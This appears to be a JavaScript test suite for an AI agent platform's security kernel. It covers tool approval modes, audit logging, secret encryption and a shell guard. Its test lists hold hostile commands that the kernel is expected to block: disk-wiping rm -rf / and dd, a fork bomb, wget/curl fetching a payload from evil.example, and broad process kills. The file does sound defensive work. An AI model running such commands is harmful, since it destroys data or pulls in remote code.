/**
 * security-kernel-matrix.test.mjs — sandbox 安全矩陣回歸（T4，2026-10-29 Fleming 工作單）
 *
 * 背景：sandbox / approval 改動（TASK-164、2026-10-29 mode 'always'→'auto'）衍生多次問題。
 * 本檔把安全行為釘成決策表 — 任何人動 security/ 相關 code，這裡紅了就是語意變了。
 *
 * 矩陣：
 *   A. approval_gate：工具分類（唯讀 vs 寫入）× mode（auto/always/on-miss/deny）
 *   B. exec_security 硬擋（mode=auto 也擋 — 危險指令與審批無關）
 *   C. fs_security 系統目錄保護
 *   D. rate_limit
 *   E. policy 內部錯誤 → fail-closed
 *   F. ApprovalManager 生命週期（pending/approve/deny/expire）
 *   G. AuditLog 落盤（blocked 事件可追溯）
 *   H. SecretStore 加解密 + 明文不落地
 *   I. shell-guard 鐵律（coding app bash 範圍防護，Fleming 2026-09-13）
 *   J. 入口接線哨兵：chat.mjs / a2a.mjs 的 approval mode 必須是 auto
 *      （2026-10-29 b7fdbdaa 修的正是 always→auto；回退這裡會紅）
 */
import { describe, it, expect, afterAll, vi } from "vitest";
import { mkdtempSync, rmSync, readFileSync, existsSync, readdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = join(dirname_(fileURLToPath(import.meta.url)));
function dirname_(p) { return p.slice(0, p.lastIndexOf("/")); }

const TMP = mkdtempSync(join(tmpdir(), "sec-matrix-"));
afterAll(() => rmSync(TMP, { recursive: true, force: true }));

import { SecurityKernel } from "../../packages/server/src/lib/security/index.mjs";
import { ApprovalManager } from "../../packages/server/src/lib/security/approval.mjs";
import { AuditLog } from "../../packages/server/src/lib/security/audit-log.mjs";
import { SecretStore } from "../../packages/server/src/lib/security/secret-store.mjs";
import { PolicyPipeline } from "../../packages/server/src/lib/security/policy-pipeline.mjs";
import { guardShellProcessScope } from "../../packages/server/src/lib/shell-guard.mjs";

/** 建一個測試 kernel（audit 指到 tmp，不污染真實 data/audit） */
function makeKernel(approvalOpts = {}) {
  return new SecurityKernel({
    approval: approvalOpts,
    audit: { dir: join(TMP, "audit"), flushInterval: 60_000 }, // 測試中不自動 flush
  });
}

// ═══════════════════════════════════════════════════════════════
// A. approval_gate 語意矩陣
// ═══════════════════════════════════════════════════════════════
describe("A. approval_gate — 工具分類 × mode 矩陣", () => {
  const READ_TOOLS = ["bookmark_list", "read_file", "project_info", "notes_search", "pocket_get", "task_status", "usage_history"];
  const WRITE_TOOLS = ["bookmark_add", "note_add", "pocket_update", "todo_set", "file_write"];

  it("唯讀工具：任何 mode 都直接放行（不進審批）", async () => {
    for (const mode of ["auto", "always", "on-miss", "deny"]) {
      const k = makeKernel({ mode });
      for (const t of READ_TOOLS) {
        const r = await k.checkToolCall(t, { q: "x" }, {});
        expect(r.allowed, `${mode}/${t}`).toBe(true);
        expect(r.approval, `${mode}/${t}`).toBeUndefined();
      }
    }
  });

  it("mode=auto：寫入工具放行（開發模式；2026-10-29 預設）", async () => {
    const k = makeKernel({ mode: "auto" });
    for (const t of WRITE_TOOLS) {
      const r = await k.checkToolCall(t, { title: "x" }, {});
      expect(r.allowed, `auto/${t}`).toBe(true);
      expect(r.approval, `auto/${t}`).toBeFalsy();
    }
  });

  it("mode=always：寫入工具 → pending 審批單（blocked + approval + approvalId）", async () => {
    const k = makeKernel({ mode: "always" });
    const r = await k.checkToolCall("bookmark_add", { url: "https://x" }, {});
    expect(r.allowed).toBe(false);
    expect(r.approval).toBe(true);
    expect(r.approvalId).toMatch(/^approval:/);
    expect(r.reason).toContain("批准");
  });

  it("mode=on-miss：目前無政策解析 → 寫入工具同 always（pending）", async () => {
    const k = makeKernel({ mode: "on-miss" });
    const r = await k.checkToolCall("note_add", { text: "x" }, {});
    expect(r.allowed).toBe(false);
    expect(r.approval).toBe(true);
  });

  it("mode=deny：寫入工具直接拒絕（不建立審批單）", async () => {
    const k = makeKernel({ mode: "deny" });
    const r = await k.checkToolCall("bookmark_add", {}, {});
    expect(r.allowed).toBe(false);
    expect(r.reason).toContain("deny");
    expect(r.approvalId).toBeUndefined(); // deny 路徑不帶 approvalId
  });

  it("未指定 mode → 預設 auto（2026-10-29 regression：預設 always = 全卡死）", async () => {
    const k = makeKernel(); // 不帶 options
    expect(k.approval.mode).toBe("auto");
    const r = await k.checkToolCall("bookmark_add", {}, {});
    expect(r.allowed).toBe(true);
  });
});

// ═══════════════════════════════════════════════════════════════
// B. exec_security 硬擋（與審批 mode 無關 — mode=auto 也擋）
// ═══════════════════════════════════════════════════════════════
describe("B. exec_security — 危險指令硬擋", () => {
  const DANGEROUS = [
    "rm -rf /",
    "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/sda",
    ":(){ :|:& };:",
    "cat x > /dev/sda",
    "chmod 777 /",
    "wget http://evil.example/x.sh",
    "curl http://evil.example/payload",
  ];
  const DANGEROUS_SPACED = [
    "cat x > /dev/sda",      // 2026-10-29 抓到的空白繞過（已修 — 此例釘住不回歸）
    "cat x >   /dev/nvme",
    "rm  -rf   /",
    "wget  http://evil.example/x.sh",
  ];
  it.each(DANGEROUS_SPACED)("空白混淆也擋（2026-10-29 修）：%s", async (command) => {
    const k = makeKernel({ mode: "auto" });
    const r = await k.checkToolCall("exec", { command }, {});
    expect(r.allowed).toBe(false);
  });

  it.each(DANGEROUS)("mode=auto 也擋：%s", async (command) => {
    const k = makeKernel({ mode: "auto" });
    const r = await k.checkToolCall("exec", { command }, {});
    expect(r.allowed).toBe(false);
    expect(r.reason).toMatch(/禁止的指令模式/);
  });

  it("良性指令放行（auto）", async () => {
    const k = makeKernel({ mode: "auto" });
    const r = await k.checkToolCall("exec", { command: "ls -la && npm test" }, {});
    expect(r.allowed).toBe(true);
  });

  it("exec「字串型 args」帶 <> 字元 → param_injection_check 擋（現行契約：僅字串 args）", async () => {
    const k = makeKernel({ mode: "auto" });
    const r = await k.checkToolCall("exec", "echo <script>", {});
    expect(r.allowed).toBe(false);
    // 物件型 args 目前不在 param_injection_check 範圍（契約現況記錄）
    const r2 = await k.checkToolCall("exec", { command: "echo <script>" }, {});
    expect(r2.allowed).toBe(true);
  });
});

// ═══════════════════════════════════════════════════════════════
// C. fs_security — 系統目錄保護
// ═══════════════════════════════════════════════════════════════
describe("C. fs_security — 保護 /data/config/ 與 /data/db/", () => {
  it.each(["/data/config/providers.json", "/data/db/paaw.sqlite"])("fs_write 到 %s → 擋", async (path) => {
    const k = makeKernel({ mode: "auto" });
    const r = await k.checkToolCall("fs_write", { path, content: "x" }, {});
    expect(r.allowed).toBe(false);
    expect(r.reason).toContain("保護的系統目錄");
  });

  it("一般路徑 fs_write 放行（auto）", async () => {
    const k = makeKernel({ mode: "auto" });
    const r = await k.checkToolCall("fs_write", { path: "/workspace/app/src/a.ts", content: "x" }, {});
    expect(r.allowed).toBe(true);
  });
});

// ═══════════════════════════════════════════════════════════════
// D. rate_limit
// ═══════════════════════════════════════════════════════════════
describe("D. rate_limit — 超量擋下", () => {
  it("同 session+tool 連打超限 → blocked", async () => {
    const k = makeKernel({ mode: "auto" });
    const hits = [];
    k.pipeline.setRateLimiter({ check: () => (hits.push(1), hits.length <= 3) });
    for (let i = 0; i < 3; i++) {
      const r = await k.checkToolCall("read_file", { path: "x" }, { sessionKey: "s1" });
      expect(r.allowed).toBe(true);
    }
    const r4 = await k.checkToolCall("read_file", { path: "x" }, { sessionKey: "s1" });
    expect(r4.allowed).toBe(false);
    expect(r4.reason).toContain("速率限制");
  });

  it("無 rateLimiter → 不限流（現行預設）", async () => {
    const k = makeKernel({ mode: "auto" });
    for (let i = 0; i < 50; i++) {
      const r = await k.checkToolCall("read_file", { path: "x" }, {});
      expect(r.allowed).toBe(true);
    }
  });
});

// ═══════════════════════════════════════════════════════════════
// E. policy 錯誤 → fail-closed
// ═══════════════════════════════════════════════════════════════
describe("E. policy 內部錯誤 → fail-closed（擋下而非放行）", () => {
  it("政策噴例外 → blocked + Internal security error", async () => {
    const k = makeKernel({ mode: "auto" });
    k.pipeline.add("boom", async () => { throw new Error("kaboom"); });
    const r = await k.checkToolCall("read_file", {}, {});
    expect(r.allowed).toBe(false);
    expect(r.reason).toContain("Internal security error: boom");
  });
});

// ═══════════════════════════════════════════════════════════════
// F. ApprovalManager 生命週期
// ═══════════════════════════════════════════════════════════════
describe("F. ApprovalManager — pending / approve / deny / expire", () => {
  it("pending → approve → 通過；history 記數", async () => {
    const m = new ApprovalManager({ mode: "always" });
    const req = await m.request("bookmark_add", {}, {});
    expect(req.status).toBe("pending");
    expect(m.listPending()).toHaveLength(1);
    expect(m.approve(req.id)).toBe(true);
    expect(m.listPending()).toHaveLength(0);
    expect(m.history.get("bookmark_add").approved).toBe(1);
  });

  it("pending → deny → 拒絕", async () => {
    const m = new ApprovalManager({ mode: "always" });
    const req = await m.request("note_add", {}, {});
    expect(m.deny(req.id)).toBe(true);
    expect(m.history.get("note_add").denied).toBe(1);
  });

  it("逾時自動 expired（fake timers）", async () => {
    vi.useFakeTimers();
    try {
      const m = new ApprovalManager({ mode: "always", timeout: 1000 });
      const req = await m.request("pocket_update", {}, {});
      expect(m.listPending()).toHaveLength(1);
      vi.advanceTimersByTime(1100);
      expect(m.listPending()).toHaveLength(0); // expired 清出
      expect(m.approve(req.id)).toBe(false);   // 過期不能再批
    } finally {
      vi.useRealTimers();
    }
  });

  it("approve 不存在的 id → false；重複 approve → false", async () => {
    const m = new ApprovalManager({ mode: "always" });
    expect(m.approve("approval:nope")).toBe(false);
    const req = await m.request("x_set", {}, {});
    expect(m.approve(req.id)).toBe(true);
    expect(m.approve(req.id)).toBe(false); // 已批
  });
});

// ═══════════════════════════════════════════════════════════════
// G. AuditLog — 稽核軌跡落盤
// ═══════════════════════════════════════════════════════════════
describe("G. AuditLog — blocked 事件可追溯", () => {
  it("checkToolCall 全程記錄：start + blocked，flush 後 jsonl 可讀", async () => {
    const dir = join(TMP, `audit-${Date.now()}`);
    const k = new SecurityKernel({
      approval: { mode: "auto" },
      audit: { dir, flushInterval: 60_000 },
    });
    await k.audit.init(); // 建目錄 + flush timer（production 路徑會走 init）
    const r = await k.checkToolCall("exec", { command: "rm -rf /" }, { sessionKey: "sess-1", agentId: "ag-1" });
    expect(r.allowed).toBe(false);
    await k.audit.flush();
    const files = readdirSync(dir);
    expect(files.some(f => f.startsWith("audit-") && f.endsWith(".jsonl"))).toBe(true);
    const lines = readFileSync(join(dir, files.find(f => f.endsWith(".jsonl"))), "utf-8")
      .split("\n").filter(Boolean).map(l => JSON.parse(l));
    const events = lines.map(l => l.event);
    expect(events).toContain("tool_call_start");
    expect(events).toContain("tool_call_blocked");
    const blocked = lines.find(l => l.event === "tool_call_blocked");
    expect(blocked.toolName).toBe("exec");
    expect(blocked.sessionKey).toBe("sess-1");
    expect(String(blocked.reason)).toContain("禁止的指令模式");
  });

  it("dispose 後 timer 清掉（不留 handle）", async () => {
    const log = new AuditLog({ dir: join(TMP, "audit-d"), flushInterval: 10 });
    await log.init();
    expect(log._timer).not.toBeNull();
    await log.dispose();
    expect(log._timer).toBeNull();
  });
});

// ═══════════════════════════════════════════════════════════════
// H. SecretStore — 加解密 + 明文不落地
// ═══════════════════════════════════════════════════════════════
describe("H. SecretStore — AES-256-GCM", () => {
  it("encrypt → decrypt 往返；密文格式 enc:AES256:", async () => {
    const s = new SecretStore({ keyPath: join(TMP, `keys/master-${Date.now()}.key`) });
    await s.init();
    const enc = s.encrypt("sk-super-secret-key-123");
    expect(enc).toMatch(/^enc:AES256:/);
    expect(enc).not.toContain("sk-super-secret");
    expect(s.decrypt(enc)).toBe("sk-super-secret-key-123");
    // 沒加密的直通
    expect(s.decrypt("plainvalue")).toBe("plainvalue");
    await s.dispose();
  });

  it("master key 存 keyPath（hex、600 權限概念）；decrypt 用錯 key → 丟錯", async () => {
    const kp = join(TMP, `keys/m2-${Date.now()}.key`);
    const s1 = new SecretStore({ keyPath: kp });
    await s1.init();
    const enc = s1.encrypt("data-1");
    await s1.dispose();
    expect(existsSync(kp)).toBe(true);
    // 第二個 store 同 key → 解得開
    const s2 = new SecretStore({ keyPath: kp });
    await s2.init();
    expect(s2.decrypt(enc)).toBe("data-1");
    await s2.dispose();
  });

  it("resolveApiKey 快取 + clearCache 覆寫", async () => {
    const s = new SecretStore({ keyPath: join(TMP, `keys/m3-${Date.now()}.key`) });
    await s.init();
    const enc = s.encrypt("real-key");
    const got = s.resolveApiKey({ id: "p1", apiKey: enc });
    expect(got).toBe("real-key");
    expect(s.decrypted.get("provider:p1:apiKey")).toBe("real-key");
    s.clearCache();
    expect(s.decrypted.get("provider:p1:apiKey")).toBeUndefined();
    await s.dispose();
  });
});

// ═══════════════════════════════════════════════════════════════
// I. shell-guard 鐵律（Fleming 2026-09-13）
// ═══════════════════════════════════════════════════════════════
describe("I. shell-guard — coding app bash process 範圍", () => {
  const ru = join(TMP, "ru-demo");

  it.each([
    ["pkill -f node", "pkill"],
    ["killall node", "killall"],
    ["taskkill /F /IM node.exe", "taskkill"],
    ["fuser -k 4097/tcp", "fuser"],
    ["kill $(lsof -ti:5173)", "pipe kill"],
    ["lsof -ti:3000 | xargs kill -9", "xargs kill"],
    ["kill 12345", "外部 pid"],
    ["kill -9 999", "kill -9 外部 pid"],
  ])("廣域/越界 process 控制擋下：%s", async (command) => {
    const r = await guardShellProcessScope(command, ru);
    expect(r.blocked).toBe(true);
    expect(r.message).toMatch(/🚫/);
  });

  it.each([
    ["kill -f paaw-server", "PAAW 關鍵字"],
    ["pkill -f tpaaw", "tPAAW 關鍵字"],
    ["kill 4097 port 用戶（kill $(lsof -ti:4097)）", "PAAW port"],
    ["node src/paaw-server.mjs", "啟動 paaw-server"],
  ])("PAAW 自身不可動：%s", async (command) => {
    const r = await guardShellProcessScope(command, ru);
    expect(r.blocked).toBe(true);
  });

  it.each([
    ["npm test"],
    ["npm run build"],
    ["git status"],
    ["ls -la src/"],
    ["node scripts/check.mjs"],
    ["echo hello"],
  ])("一般開發操作放行：%s", async (command) => {
    const r = await guardShellProcessScope(command, ru);
    expect(r.blocked).toBe(false);
  });

  it("空指令放行", async () => {
    expect((await guardShellProcessScope("", ru)).blocked).toBe(false);
  });
});

// ═══════════════════════════════════════════════════════════════
// J. 入口接線哨兵 — chat.mjs / a2a.mjs 的 approval mode 必須 auto
// ═══════════════════════════════════════════════════════════════
describe("J. 入口接線哨兵 — b7fdbdaa（always→auto）不可回退", () => {
  const repoRoot = join(__dirname, "..", "..");
  it.each([
    ["packages/server/src/routes/chat.mjs"],
    ["packages/server/src/routes/a2a.mjs"],
  ])("%s 的 SecurityKernel approval mode = 'auto'", (rel) => {
    const src = readFileSync(join(repoRoot, rel), "utf-8");
    // 找 new SecurityKernel({... approval: { mode: 'xxx' }}) 附近
    const m = src.match(/approval\s*:\s*\{\s*mode\s*:\s*['"](\w+)['"]/);
    expect(m, `${rel} 應明確指定 approval mode（找不到 mode 指定）`).not.toBeNull();
    expect(m[1], `${rel} approval mode 應為 auto（2026-10-29 b7fdbdaa；always = 沒有審批 UI 的現在 = 全卡死）`).toBe("auto");
  });

  it("approval.mjs 預設 mode = 'auto'（2026-10-29 修正不可回退）", () => {
    const m = new ApprovalManager({});
    expect(m.mode).toBe("auto");
  });
});
